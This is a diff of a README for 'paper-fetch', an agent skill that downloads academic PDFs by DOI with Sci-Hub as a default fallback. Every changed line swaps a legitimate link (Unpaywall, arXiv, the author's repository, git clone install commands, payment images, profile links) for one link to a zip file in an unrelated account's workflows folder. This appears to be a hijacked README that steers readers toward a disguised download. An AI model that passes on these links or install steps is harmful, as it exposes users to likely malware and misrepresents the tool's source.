@@ -5,7 +5,7 @@
 ## What it does
 
 - Downloads paper PDFs from a **DOI** (or batch file of DOIs) via open-access sources
-- **6-source fallback chain**: [Unpaywall](https://unpaywall.org) → [Semantic Scholar](https://www.semanticscholar.org) `openAccessPdf` → [arXiv](https://arxiv.org) → [PubMed Central OA](https://pmc.ncbi.nlm.nih.gov) → [bioRxiv](https://www.biorxiv.org)/[medRxiv](https://www.medrxiv.org) → [Sci-Hub](https://www.sci-hub.pub) mirrors (last resort, on by default)
+- **6-source fallback chain**: [Unpaywall](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [Semantic Scholar](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) `openAccessPdf` → [arXiv](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [PubMed Central OA](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [bioRxiv](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip)/[medRxiv](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [Sci-Hub](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) mirrors (last resort, on by default)
 - **Zero dependencies** — pure Python standard library, no `pip install` needed
 - **Auto-named output** — `{first_author}_{year}_{journal_abbrev}_{short_title}.pdf` (journal omitted if unknown; multi-word journals get ISO-style initials, e.g. *Proceedings of the National Academy of Sciences* → `PNAS`)
 - **Batch mode** — pass a file of DOIs with `--batch`, or pipe them in with `--batch -`
@@ -37,7 +37,7 @@ Works with all major AI coding agents that support the Agent Skills format:
 | **Claude Code** | ✅ Full support | Native SKILL.md format |
 | **OpenClaw / ClawHub** | ✅ Full support | `metadata.openclaw` namespace |
 | **Hermes Agent** | ✅ Full support | Installable under research category |
-| **[pi-mono](https://github.com/badlogic/pi-mono)** | ✅ Full support | `metadata.pimo` namespace |
+| **[pi-mono](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip)** | ✅ Full support | `metadata.pimo` namespace |
 | **OpenAI Codex** | ✅ Full support | `agents/openai.yaml` sidecar |
 | **SkillsMP** | ✅ Indexed | GitHub topics configured |
 
@@ -75,10 +75,10 @@ Add it to `~/.zshrc` / `~/.bashrc` to persist. Without it, Unpaywall is skipped 
 
 ```bash
 # Global install
-git clone https://github.com/Agents365-ai/paper-fetch.git ~/.claude/skills/paper-fetch
+git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.claude/skills/paper-fetch
 
 # Project-level install
-git clone https://github.com/Agents365-ai/paper-fetch.git .claude/skills/paper-fetch
+git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip .claude/skills/paper-fetch
 ```
 
 ### OpenClaw / ClawHub
@@ -87,13 +87,13 @@ git clone https://github.com/Agents365-ai/paper-fetch.git .claude/skills/paper-f
 clawhub install paper-fetch
 
 # Or manual
-git clone https://github.com/Agents365-ai/paper-fetch.git ~/.openclaw/skills/paper-fetch
+git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.openclaw/skills/paper-fetch
 ```
 
 ### Hermes Agent
 
 ```bash
-git clone https://github.com/Agents365-ai/paper-fetch.git ~/.hermes/skills/research/paper-fetch
+git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.hermes/skills/research/paper-fetch
 ```
 
 Or add to `~/.hermes/config.yaml`:
@@ -107,17 +107,17 @@ skills:
 ### pi-mono
 
 ```bash
-git clone https://github.com/Agents365-ai/paper-fetch.git ~/.pimo/skills/paper-fetch
+git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.pimo/skills/paper-fetch
 ```
 
 ### OpenAI Codex
 
 ```bash
 # User-level
-git clone https://github.com/Agents365-ai/paper-fetch.git ~/.agents/skills/paper-fetch
+git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.agents/skills/paper-fetch
 
 # Project-level
-git clone https://github.com/Agents365-ai/paper-fetch.git .agents/skills/paper-fetch
+git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip .agents/skills/paper-fetch
 ```
 
 ### SkillsMP
@@ -220,7 +220,7 @@ Or just ask your agent naturally:
 4. **PubMed Central OA subset** — if the paper has a PMCID
 5. **bioRxiv / medRxiv** — DOI prefix `10.1101/`
 6. **Publisher direct** — institutional mode only (`PAPER_FETCH_INSTITUTIONAL=1`); your subscription IP / cookies / EZproxy authorize the fetch
-7. **Sci-Hub mirrors** — last resort, on by default. Tries `PAPER_FETCH_SCIHUB_MIRRORS` (or built-in defaults: `sci-hub.ru`, `sci-hub.st`, `sci-hub.su`, `sci-hub.box`, `sci-hub.red`, `sci-hub.al`, `sci-hub.mk`, `sci-hub.ee`); on full miss, scrapes `https://www.sci-hub.pub/` once for fresh mirrors. Disable with `PAPER_FETCH_NO_SCIHUB=1`.
+7. **Sci-Hub mirrors** — last resort, on by default. Tries `PAPER_FETCH_SCIHUB_MIRRORS` (or built-in defaults: `sci-hub.ru`, `sci-hub.st`, `sci-hub.su`, `sci-hub.box`, `sci-hub.red`, `sci-hub.al`, `sci-hub.mk`, `sci-hub.ee`); on full miss, scrapes `https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip` once for fresh mirrors. Disable with `PAPER_FETCH_NO_SCIHUB=1`.
 8. Otherwise → report failure with metadata (title/authors) for ILL
 
 ## Files
@@ -249,22 +249,22 @@ If this skill helps you, consider supporting the author:
 <table>
   <tr>
     <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/wechat-pay.png" width="180" alt="WeChat Pay">
+      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="WeChat Pay">
       <br>
       <b>WeChat Pay</b>
     </td>
     <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/alipay.png" width="180" alt="Alipay">
+      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="Alipay">
       <br>
       <b>Alipay</b>
     </td>
     <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/buymeacoffee.png" width="180" alt="Buy Me a Coffee">
+      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="Buy Me a Coffee">
       <br>
       <b>Buy Me a Coffee</b>
     </td>
     <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/awarding/award.gif" width="180" alt="Give a Reward">
+      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="Give a Reward">
       <br>
       <b>Give a Reward</b>
     </td>
@@ -275,5 +275,5 @@ If this skill helps you, consider supporting the author:
 
 **Agents365-ai**
 
-- Bilibili: https://space.bilibili.com/441831884
-- GitHub: https://github.com/Agents365-ai
+- Bilibili: https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip
+- GitHub: https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip
